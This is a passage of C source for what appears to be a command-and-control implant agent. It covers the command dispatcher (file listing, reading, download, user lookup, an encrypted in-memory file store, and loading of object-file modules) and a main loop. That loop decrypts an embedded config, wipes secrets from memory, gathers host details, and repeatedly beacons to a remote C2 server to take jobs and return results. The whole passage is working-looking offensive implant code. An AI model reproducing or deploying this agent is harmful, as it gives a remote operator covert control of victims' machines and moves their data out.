      free(obj);
      return;
    }
    TRACE("[agent] custom_module %s: %zu args export=%s\n", mod_name, tokenc,
          export_name);
    execute_bof(s, mem, obj, obj_len, export_name, tokens, tokenc, out);
    free(tokbuf);
    free(obj);
    return;
  }
#endif

  /* Unreachable: the type was validated above. */
  free(invocation);
  free(tokbuf);
  free(obj);
  obuf_append(out, "custom_module: unsupported module type\n", 37);
}

#endif

static void dispatch(const c2_msgtun *m, c2_agent_session *s, c2_memfile *mem,
                     obuf *out) {
  if (m->cmd_slice.count == 0)
    return;

  /* Command names may arrive C2-prefixed ("!stat", "!ls_dir"); strip the '!'
   * so one handler covers both the core and C2 spellings. */
  c2_str name = m->cmd_slice.items[0];
  if (name.ptr != NULL && name.len > 0 && name.ptr[0] == '!') {
    name.ptr++;
    name.len--;
  }

  char arg[512], arg2[512];
  c2_cmd_argn(&m->cmd_slice, 1, arg, sizeof(arg));
  c2_cmd_argn(&m->cmd_slice, 2, arg2, sizeof(arg2));

  if (cmd_eq(name, "ls") || cmd_eq(name, "ls_dir")) {
    c2_cmd_pick_path(&m->cmd_slice, 1, ".", arg, sizeof(arg));
    run_ls(mem, arg, out);
  } else if (cmd_eq(name, "pwd")) {
    run_pwd(out);
  } else if (cmd_eq(name, "cd")) {
    c2_cmd_pick_path(&m->cmd_slice, 1, NULL, arg, sizeof(arg));
    run_cd(arg, out);
  } else if (cmd_eq(name, "stat")) {
    c2_cmd_pick_path(&m->cmd_slice, 1, ".", arg, sizeof(arg));
    run_stat(arg, out);
  } else if (cmd_eq(name, "whoami")) {
    const char *u = getenv("USER");
    if (u != NULL) {
      obuf_append(out, u, strlen(u));
      obuf_append(out, "\n", 1);
    }
  } else if (cmd_eq(name, "mem_write")) {
    char key[512];
    size_t kl = c2_memfile_key(arg, strlen(arg), key, sizeof(key));
    if (kl == 0) {
      obuf_append(out, "invalid key\n", 12);
    } else {
      c2_status st = c2_memfile_write(mem, c2_str_of(key, kl),
                                      (const uint8_t *)arg2, strlen(arg2));
      if (st == C2_OK)
        obuf_append(out, "ok\n", 3);
      else
        obuf_append(out, "write failed\n", 13);
    }
  } else if (cmd_eq(name, "mem_read")) {
    char key[512];
    size_t kl = c2_memfile_key(arg, strlen(arg), key, sizeof(key));
    if (kl == 0)
      obuf_append(out, "invalid key\n", 12);
    else
      run_mem_read(mem, key, out);
  } else if (cmd_eq(name, "cat")) {
    c2_cmd_pick_path(&m->cmd_slice, 1, NULL, arg, sizeof(arg));
    if (is_mem_path(arg))
      run_mem_read(mem, arg, out);
    else
      run_cat(arg, out);
  } else if (cmd_eq(name, "mem_ls")) {
    run_mem_ls(mem, out);
  } else if (cmd_eq(name, "download")) {
    run_download(s, mem, arg, out);
#if C2_AGENT_ENABLE_BOF || C2_AGENT_ENABLE_RVVM
  } else if (cmd_eq(name, "custom_module")) {
    run_custom_module(s, mem, &m->cmd_slice, out);
#endif
#if C2_AGENT_ENABLE_BOF
  } else if (cmd_eq(name, "bof")) {
    run_bof(s, mem, &m->cmd_slice, out);
#endif
  } else {
    obuf_append(out, "unsupported command\n", 20);
  }
}

/* ------------------------------------------------------------------------- */
/* main */
/* ------------------------------------------------------------------------- */

/* Exported so a shared-object build (and malasada's raw PIC) can resolve the
 * entry from .dynsym; the agent is built with -fvisibility=hidden, which would
 * otherwise drop it. Harmless for the executable. */
__attribute__((visibility("default"))) int main(void) {
  TRACE("[agent] start\n");
  c2_crypto_backend *be = c2_crypto_open();
  if (be == NULL) {
    TRACE("[agent] no crypto backend\n");
    return 1;
  }

  uint8_t plain[16384];
  size_t plain_len = 0;
  c2_str magic = c2_str_of((const char *)c2_magic_string, c2_magic_string_len);
  c2_status st =
      c2_config_decrypt(be, magic, c2_embedded_config, c2_embedded_config_len,
                        plain, sizeof(plain), &plain_len);
  if (st != C2_OK) {
    TRACE("[agent] config decrypt failed: %d\n", st);
    return 1;
  }
  TRACE("[agent] config decrypted: %zu bytes\n", plain_len);
  wipe_rodata(c2_embedded_config, c2_embedded_config_len);

  c2_agent_config cfg;
  memset(&cfg, 0, sizeof(cfg));
  CborParser parser;
  CborValue it;
  if (cbor_parser_init(plain, plain_len, 0, &parser, &it) != CborNoError) {
    TRACE("[agent] cbor init failed\n");
    return 1;
  }
  if ((st = c2_agent_config_decode(&it, &cfg)) != C2_OK) {
    TRACE("[agent] config decode failed: %d\n", st);
    return 1;
  }
  cfg.magic_string = magic;
  /* The stager maps a mask entry point beside the agent; probe it
   * unconditionally. Non-stager launches fail validation and keep normal
   * sleep behavior. */
  (void)c2_stager_mask_bind();
  TRACE("[agent] cfg host=%.*s http_port=%.*s mode=%.*s\n",
        (int)cfg.cc_address.len, cfg.cc_address.ptr, (int)cfg.cc_http_port.len,
        cfg.cc_http_port.ptr, (int)cfg.c2_channel_mode.len,
        cfg.c2_channel_mode.ptr);

  /* A supervising stager caches the identity scalar across recycled children:
   * the C2 pins the public key at first check-in and rejects a changed key. */
  uint8_t restored_priv[C2_AGENT_KEY_LEN];
  uint8_t restored_pub[C2_P256_PUB_BYTES];
  int have_restored = 0;
  if (cfg.is_run_by_stager && c2_agent_identity_supervisor_present()) {
    int r = c2_agent_identity_import(be, restored_priv, restored_pub);
    if (r > 0)
      have_restored = 1;
  }

  c2_transport transport = c2_transport_create(&cfg);
  c2_agent_session s;
  if ((st = c2_session_init(&s, be, transport, &cfg,
                            have_restored ? restored_priv : NULL)) != C2_OK) {
    TRACE("[agent] session init failed: %d\n", st);
    return 1;
  }
  if (have_restored)
    c2_session_set_identity_pub(&s, restored_pub);
  if (cfg.is_run_by_stager)
    c2_agent_identity_export(s.agent_priv);
  c2_secure_zero(restored_priv, sizeof(restored_priv));
  c2_secure_zero(restored_pub, sizeof(restored_pub));
  /* The PSK is derived in c2_session_init; the build secret is not needed
   * after this point. */
  wipe_rodata(c2_magic_string, c2_magic_string_len);
  cfg.magic_string = c2_str_of(NULL, 0);
  TRACE("[agent] session init ok\n");

  /* In-memory file cache (memfs): entries are gzip-compressed and
   * AES-GCM-encrypted with the build config's file password. */
  c2_memfile mem;
  c2_memfile_init(&mem, be, cfg.password, C2_MEMFILE_DEFAULT_MAX_BYTES);

  /* Host facts for the check-in body, mirroring the Go agent's
   * GatherSystemDetails (identity, OS/arch/kernel, user, process, uptime,
   * IPs, memfs listing, transport label). */
  c2_agent_info info;
  c2_sysinfo_store sysinfo;
  if ((st = c2_gather_agent_info(&info, &cfg, &mem, c2_build_version,
                                 &sysinfo)) != C2_OK) {
    TRACE("[agent] gather info failed: %d\n", st);
    return 1;
  }
  /* Every agent decides its own removal deadline. The C2 never probes it
   * while the agent sleeps; it keeps the record until this deadline. */
  {
    int64_t grace = cfg.offline_grace;
    if (grace <= 0) {
      int32_t window =
          cfg.poll_window > 0 ? cfg.poll_window : C2_DEFAULT_POLL_WINDOW;
      unsigned interval = c2_poll_interval_seconds(&cfg);
      grace = (int64_t)interval + window + interval / 2;
    }
    info.has_offline_grace = 1;
    info.offline_grace = grace;
  }

  /* Check in once, then beacon on the message route. A short read window
   * means an idle agent closes the tunnel and masks instead of being pinned
   * by the C2's 35-70s HTTP long-poll. Commands issued while it sleeps are
   * queued by the C2 and delivered by the next hello. */
  int need_checkin = 1;
  for (;;) {
    if (need_checkin) {
      if ((st = c2_session_checkin(&s, &info)) != C2_OK) {
        TRACE("[agent] checkin failed: %d\n", st);
        agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
        continue;
      }
      TRACE("[agent] checkin ok\n");
      need_checkin = 0;
    }

    c2_secureconn msg;
    if ((st = c2_session_open_route(&s, cfg.routes.msg, c2_str_lit(""),
                                    &msg)) != C2_OK) {
      TRACE("[agent] msg route open failed: %d\n", st);
      need_checkin = 1;
      agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
      continue;
    }
    if ((st = c2_session_hello(&s, &msg, 1)) != C2_OK) {
      TRACE("[agent] hello failed: %d\n", st);
      c2_secureconn_close(&msg);
      need_checkin = 1;
      agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
      continue;
    }
    TRACE("[agent] hello sent\n");

    int tunnel_failed = 0;
    for (;;) {
      c2_msgtun m;
      memset(&m, 0, sizeof(m));
      int is_job = 0;
      if ((st = c2_session_read(&s, &msg, &m, &is_job)) != C2_OK) {
        if (st == C2_ERR_TIMEOUT) {
          TRACE("[agent] idle poll window elapsed, sleeping\n");
          break;
        }
        TRACE("[agent] read failed: %d\n", st);
        tunnel_failed = 1;
        break;
      }
      if (!is_job)
        continue;
      TRACE("[agent] job received\n");

      obuf out = {0};
      dispatch(&m, &s, &mem, &out);
      (void)c2_session_send_result(&s, &msg, m.job_id, &m.cmd_slice,
                                   (const uint8_t *)out.p, out.len);
      free(out.p);
    }

    c2_secureconn_close(&msg);
    if (tunnel_failed)
      need_checkin = 1;
    TRACE("[agent] masked sleep\n");
    agent_sleep(&cfg, c2_poll_sleep_seconds(be, &cfg));
  }
}
